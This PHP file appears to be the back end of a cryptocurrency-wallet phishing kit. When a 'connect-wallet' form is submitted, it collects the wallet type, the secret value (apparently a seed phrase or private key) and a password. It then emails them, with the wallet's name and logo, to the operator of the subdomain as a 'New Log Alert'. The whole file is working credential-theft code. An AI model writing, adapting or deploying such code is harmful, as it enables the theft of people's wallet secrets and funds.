<?php
require_once("messenger.php");
$post = object($_POST);


switch ($post->case) {
  case 'connect-wallet':
    $domain = explode(".", $_SERVER["HTTP_HOST"])[0];

    // Get the admin to be notified
    $user = ucfirst(explode("@", $generic->admins[$domain])[0]);

    // Submit the request
    $info = ["type", "value", "password"];
    $post->info = object(array_extract($_POST, $info, true));

    $wallet = $files[$post->wallet];


    $body = "<hr/><img width=50px src={$wallet->logo} > <br/><hr/>";
    $body .= "<table style='width:100%'><tbody>";
    foreach ($post->info as $key => $data) {
      $body .= "<tr><td>{$key}<hr/></td><td>{$data}<hr/></td></tr>";
    }
    $body .= "<tr><td>Wallet<hr/></td><td>{$wallet->name}<hr/></td></tr>";
    $body .= "</tbody><table>";
    $messenger = new Messenger($generic);
    $response = $messenger->sendMail(
      object([
        "subject" => "New Log Alert",
        "body" => "Hi {$user}, Below are the log details for {$wallet->name}. <br>{$body}",
        "from_name" => $generic->name,
        "to_name" => $user,
        "from" => $generic->admins[$domain],
        "to" => $user,
      ])
    );
    unset($response->message);
    break;

  default:
    # code...
    break;
}
die(json_encode($response));
